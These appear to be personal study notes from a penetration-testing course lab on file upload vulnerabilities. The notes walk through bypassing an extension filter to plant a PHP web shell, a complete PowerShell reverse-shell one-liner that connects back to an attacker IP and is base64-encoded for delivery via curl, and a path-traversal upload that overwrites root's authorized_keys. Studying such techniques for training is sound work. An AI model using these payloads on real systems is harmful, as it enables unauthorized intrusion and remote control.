After we identify the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system

One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension[2](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-upload-vulnerabilities-44692/using-executable-files-44644#fn-local_id_228-2) such as **.phps** or **.php7**. This may allow us to bypass simple filters that only check for the most common file extensions, **.php** and **.phtml**. or by changing characters in the file extension to upper case(PHP or pHP)

example:

we will upload a simple webshell that can take params from cmd(find this in /usr/share/webshells/php), then we can run command below(dir where we uploaded the file, in this case it is called uploads):
```
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

note the php extension as target seemed to blacklist php files.

Next,
powershell one liner for windows backdoor:
```
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit
```

then send the encoded text through cmd:
```
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

Using non executable files:

lets say we cant find any routes to index.php or admin.php(other routes that indicate an executable file),but we can still upload files:

With burp we can intercept the req and try to send the file to a sequence of ../ aka root of system.

Next we can try to overwrite that but We should be aware, that blindly overwriting files in a real-life penetration test could result in lost data or costly downtime of a production system.

first we need to run:
```
ssh-keygen
```

rename the public key(filename.pub) -> authorized_keys

then upload and specify ../../../../../root/.ssh/authorized_keys as the filename.

once uploaded, if this overwrote the authorized_keys file, we should now have our pub key in there so we can ssh as root.



**Note** When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.



